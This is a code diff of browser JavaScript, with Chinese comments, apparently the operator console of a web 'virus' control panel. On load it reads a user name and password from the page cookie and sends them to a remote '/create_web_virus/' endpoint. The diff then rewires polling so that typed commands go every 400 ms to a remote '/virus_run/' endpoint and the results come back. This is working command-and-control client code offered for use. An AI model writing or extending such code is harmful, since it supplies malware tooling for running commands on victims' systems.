@@ -1,3 +1,5 @@
+var command = 'none';
+
 document.onkeydown = function(ev) 
 {
     var event = ev || window.event;
@@ -5,10 +7,9 @@ document.onkeydown = function(ev)
         var c = document.getElementById("in_command");
         var console = document.getElementById('console');
 
-        var command = c.value;
+        command = c.value;
 
         console.innerHTML += "执行: " + c.value +"<br />";
-        c.value = ''
 
         if (command == 'clear') {
             console.innerHTML = '';
@@ -18,7 +19,7 @@ document.onkeydown = function(ev)
 
 window.onload = function() {
     try {
-        var console = document.getElementById('console');
+        var console_dom = document.getElementById('console');
         var xhr = new XMLHttpRequest();
         var json = JSON.parse(document.cookie);
         xhr.open("GET" , remote+"/create_web_virus/"+json.user+"/"+json.pwd , true);
@@ -31,7 +32,7 @@ window.onload = function() {
             {
                 var get_message = new XMLHttpRequest();
                 get_message.open(
-                    'GET',remote+"/run/"+response , true
+                    'GET',remote+"/virus_run/"+token+"/"+command , true
                     );
                 get_message.send();
                 get_message.onload = function() 
@@ -41,8 +42,10 @@ window.onload = function() {
                         var r = get_message.responseText;
                         if (r.replace('\n','') != 'none')
                         {
-                            console.innerHTML += '执行结果:<br />'+r;  
+                            console.log(r);
+                            //console_dom.innerHTML += '执行结果:<br />'+r;  
                         }
+                        command = 'none'
                     }
                 }
             } , 400); //使用短轮询，不是 websocket 用不起，而是短轮询更有性价比.
